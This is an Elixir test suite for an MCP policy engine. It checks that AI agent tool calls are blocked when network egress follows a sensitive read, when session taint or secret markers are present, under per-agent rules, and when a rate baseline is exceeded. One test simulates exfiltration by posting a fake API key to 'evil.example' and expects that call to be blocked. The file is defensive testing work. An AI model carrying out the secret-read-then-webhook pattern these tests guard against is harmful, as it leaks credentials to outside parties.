defmodule PhoenixElxirBeam.MCP.PolicyEngineTest do
  # Every verdict now fans out to the EventLogSink (SQLite insert); run
  # serially to avoid the file-wide write-lock contention with other suites.
  use ExUnit.Case, async: false

  alias PhoenixElxirBeam.MCP.{EventLog, PolicyEngine}
  alias PhoenixElxirBeam.Repo

  setup do
    :ok = Ecto.Adapters.SQL.Sandbox.checkout(Repo)

    name = :"policy_engine_#{System.unique_integer([:positive])}"
    {:ok, pid} = start_supervised({PolicyEngine, name: name})
    # PolicyEngine persists every verdict from its own GenServer process —
    # let it borrow this test's sandboxed connection so that write is
    # visible (and rolled back) within this test rather than erroring.
    Ecto.Adapters.SQL.Sandbox.allow(Repo, self(), pid)

    %{name: name}
  end

  test "benign two-call sequence is entirely allowed", %{name: name} do
    session_id = "session-benign"
    :ok = PolicyEngine.start_session(session_id, :benign, nil, name)

    assert {:allow, event1} =
             PolicyEngine.record_call(session_id, "files", "list_files", [], name)

    assert event1.status == :ok

    assert {:allow, event2} =
             PolicyEngine.record_call(session_id, "net", "check_status", [], name)

    assert event2.status == :ok
  end

  test "network egress after a sensitive read in the same session is blocked", %{name: name} do
    session_id = "session-attack"
    :ok = PolicyEngine.start_session(session_id, :attack, nil, name)

    assert {:allow, _event} =
             PolicyEngine.record_call(
               session_id,
               "files",
               "read_secrets",
               [:sensitive_read],
               name
             )

    assert {:block, event} =
             PolicyEngine.record_call(session_id, "net", "post_webhook", [:network_egress], name)

    assert event.status == :blocked
    assert is_binary(event.reason)
  end

  test "same tools split across two different session ids do not leak across sessions", %{
    name: name
  } do
    session_a = "session-a"
    session_b = "session-b"
    :ok = PolicyEngine.start_session(session_a, :attack, nil, name)
    :ok = PolicyEngine.start_session(session_b, :attack, nil, name)

    assert {:allow, _event} =
             PolicyEngine.record_call(session_a, "files", "read_secrets", [:sensitive_read], name)

    assert {:allow, event} =
             PolicyEngine.record_call(session_b, "net", "post_webhook", [:network_egress], name)

    assert event.status == :ok
  end

  test "a call for a session with no state on record fails closed", %{name: name} do
    assert {:block, event} =
             PolicyEngine.record_call("never-started", "files", "list_files", [], name)

    assert event.status == :blocked
    assert event.reason =~ "no session state on record"
  end

  test "a call with no session id fails closed", %{name: name} do
    assert {:block, event} = PolicyEngine.record_call(nil, "files", "list_files", [], name)

    assert event.status == :blocked
    assert event.reason =~ "no session id"
  end

  test "ensure_session is idempotent and never resets tags already accumulated", %{name: name} do
    session_id = "session-ensure"
    :ok = PolicyEngine.ensure_session(session_id, nil, name)

    assert {:allow, _event} =
             PolicyEngine.record_call(
               session_id,
               "files",
               "read_secrets",
               [:sensitive_read],
               name
             )

    :ok = PolicyEngine.ensure_session(session_id, nil, name)

    assert {:block, event} =
             PolicyEngine.record_call(session_id, "net", "post_webhook", [:network_egress], name)

    assert event.status == :blocked
  end

  test "a pipeline block records which plugin decided in the durable log", %{name: name} do
    session_id = "session-decisions"
    :ok = PolicyEngine.start_session(session_id, :attack, nil, name)

    {:allow, _} =
      PolicyEngine.record_call(session_id, "files", "read_secrets", [:sensitive_read], name)

    {:block, event} =
      PolicyEngine.record_call(session_id, "net", "post_webhook", [:network_egress], name)

    %{entries: entries} = EventLog.list(%{page_size: 100})
    row = Enum.find(entries, &(&1.event_id == event.id))

    assert [%{"plugin" => "chain-exfil", "verdict" => "deny"}] = row.decisions
  end

  test "record_blocked/5 receipts a blocked event without needing session state", %{name: name} do
    assert {:block, event} =
             PolicyEngine.record_blocked(
               "no-session",
               "real-abc",
               "note",
               "tool definition changed since registration",
               name
             )

    assert event.status == :blocked
    assert event.reason =~ "changed since registration"

    %{entries: entries} = EventLog.list(%{page_size: 100})
    assert Enum.any?(entries, &(&1.event_id == event.id and &1.status == "blocked"))
  end

  test "verdicts are durably persisted for allows as well as blocks", %{name: name} do
    session_id = "session-receipts"
    :ok = PolicyEngine.start_session(session_id, :benign, nil, name)

    assert {:allow, allow_event} =
             PolicyEngine.record_call(session_id, "files", "list_files", [], name)

    assert {:block, block_event} =
             PolicyEngine.record_call("never-started", "net", "post_webhook", [], name)

    %{entries: entries} = EventLog.list(%{page_size: 100})
    entry_ids = Enum.map(entries, & &1.event_id)

    assert allow_event.id in entry_ids
    assert block_event.id in entry_ids

    assert Enum.find(entries, &(&1.event_id == allow_event.id)).status == "ok"
  end

  test "a post_call taint source blocks a later egress even with no sensitive_read tag", %{
    name: name
  } do
    session_id = "session-taint"
    :ok = PolicyEngine.start_session(session_id, :untagged_exfil, nil, name)

    # An untagged read: allowed, no tag accumulated.
    assert {:allow, _} = PolicyEngine.record_call(session_id, "files", "read_config", [], name)

    # The response scan found a secret and tainted the session.
    source = %{origin_tool: "read_config", finding_type: "secret_leak", at: DateTime.utc_now()}

    :ok =
      PolicyEngine.record_response_scan(
        session_id,
        "files",
        "read_config",
        [],
        nil,
        [source],
        name
      )

    assert {:block, event} =
             PolicyEngine.record_call(session_id, "net", "post_webhook", [:network_egress], name)

    assert event.status == :blocked
    assert event.reason =~ "secret"
    assert event.reason =~ "read_config"
  end

  test "taint accumulation is deduped and a clean scan with no taint is a no-op", %{name: name} do
    session_id = "session-taint-dedup"
    :ok = PolicyEngine.start_session(session_id, :untagged_exfil, nil, name)

    source = %{origin_tool: "read_config", finding_type: "secret_leak", at: DateTime.utc_now()}

    assert :ok =
             PolicyEngine.record_response_scan(
               session_id,
               "files",
               "read_config",
               [],
               nil,
               [source],
               name
             )

    # Same origin+type again — no second taint row, still just one block.
    assert :ok =
             PolicyEngine.record_response_scan(
               session_id,
               "files",
               "read_config",
               [],
               nil,
               [source],
               name
             )

    # A genuinely clean scan short-circuits before the GenServer.
    assert :ok =
             PolicyEngine.record_response_scan(
               session_id,
               "files",
               "list_files",
               [],
               nil,
               [],
               name
             )

    assert {:block, _event} =
             PolicyEngine.record_call(session_id, "net", "post_webhook", [:network_egress], name)
  end

  test "a session's agent identity is recorded and persisted on every event", %{name: name} do
    session_id = "session-agent"
    :ok = PolicyEngine.start_session(session_id, :benign, "agent://ci-runner", name)

    {:allow, event} = PolicyEngine.record_call(session_id, "files", "list_files", [], name)

    %{entries: entries} = EventLog.list(%{page_size: 100})
    row = Enum.find(entries, &(&1.event_id == event.id))
    assert row.agent_id == "agent://ci-runner"
  end

  test "a call whose argument carries a tracked secret is blocked by marker", %{name: name} do
    session_id = "session-secret-arg"
    :ok = PolicyEngine.start_session(session_id, :secret_arg_exfil, "agent://demo", name)

    {:allow, _} = PolicyEngine.record_call(session_id, "files", "read_secrets", [], name)

    secret = "API_KEY=sk-demo-FAKE1234"

    source = %{
      origin_tool: "read_secrets",
      finding_type: "secret_leak",
      at: DateTime.utc_now(),
      markers: PhoenixElxirBeam.MCP.TaintMarker.markers_for_secret(session_id, secret),
      hint: "API_K…24"
    }

    :ok =
      PolicyEngine.record_response_scan(
        session_id,
        "files",
        "read_secrets",
        [],
        nil,
        [source],
        name
      )

    # Egress carrying the exact secret bytes in an argument → blocked.
    assert {:block, event} =
             PolicyEngine.record_call(
               session_id,
               "net",
               "post_webhook",
               [:network_egress],
               name,
               %{"url" => "https://evil.example", "body" => "psst: #{secret}"}
             )

    assert event.status == :blocked
    assert event.reason =~ "argument carries a secret"

    %{entries: entries} = EventLog.list(%{page_size: 100})
    row = Enum.find(entries, &(&1.event_id == event.id))
    assert [%{"plugin" => "tainted-arg-guard", "verdict" => "deny"}] = row.decisions
    assert Enum.any?(row.findings, &(&1["type"] == "tainted_argument"))
    # the raw secret must never reach the durable log
    refute inspect(row) =~ "sk-demo-FAKE1234"
  end

  test "a config rule denies a named agent's egress pre-emptively (no sensitive read)", %{
    name: name
  } do
    session_id = "session-ci-runner"
    :ok = PolicyEngine.start_session(session_id, :restricted_agent, "agent://ci-runner", name)

    # A plain read is fine.
    assert {:allow, _} = PolicyEngine.record_call(session_id, "files", "list_files", [], name)

    # Egress is denied by the rule-engine rule, with no prior sensitive read.
    assert {:block, event} =
             PolicyEngine.record_call(session_id, "net", "post_webhook", [:network_egress], name)

    assert event.status == :blocked
    assert event.reason =~ "ci-runner"

    %{entries: entries} = EventLog.list(%{page_size: 100})
    row = Enum.find(entries, &(&1.event_id == event.id))
    assert [%{"plugin" => "rule-engine", "verdict" => "deny"}] = row.decisions
  end

  test "ensure_session records the agent the first time and never overwrites it", %{name: name} do
    session_id = "session-agent-fixed"

    :ok = PolicyEngine.ensure_session(session_id, "agent://first", name)
    # A later call presenting a different (or absent) agent must not change it.
    :ok = PolicyEngine.ensure_session(session_id, "agent://second", name)
    :ok = PolicyEngine.ensure_session(session_id, nil, name)

    {:allow, event} = PolicyEngine.record_call(session_id, "files", "list_files", [], name)

    %{entries: entries} = EventLog.list(%{page_size: 100})
    row = Enum.find(entries, &(&1.event_id == event.id))
    assert row.agent_id == "agent://first"
  end

  test "a rapid burst of watched calls trips the behavioural baseline", %{name: name} do
    session_id = "session-rapid-probe"
    :ok = PolicyEngine.start_session(session_id, :rapid_probing, "agent://demo", name)

    # test.exs configures BaselineGuard with max_calls: 3 for :sensitive_read.
    for _ <- 1..3 do
      assert {:allow, _} =
               PolicyEngine.record_call(
                 session_id,
                 "files",
                 "read_secrets",
                 [:sensitive_read],
                 name
               )
    end

    assert {:block, event} =
             PolicyEngine.record_call(
               session_id,
               "files",
               "read_secrets",
               [:sensitive_read],
               name
             )

    assert event.status == :blocked
    assert event.reason =~ "baseline exceeded"

    %{entries: entries} = EventLog.list(%{page_size: 100})
    row = Enum.find(entries, &(&1.event_id == event.id))
    assert [%{"plugin" => "baseline-guard", "verdict" => "deny"}] = row.decisions
  end

  test "untagged calls do not count toward the baseline", %{name: name} do
    session_id = "session-untagged-burst"
    :ok = PolicyEngine.start_session(session_id, :benign, "agent://demo", name)

    for _ <- 1..6 do
      assert {:allow, _} = PolicyEngine.record_call(session_id, "files", "list_files", [], name)
    end
  end
end
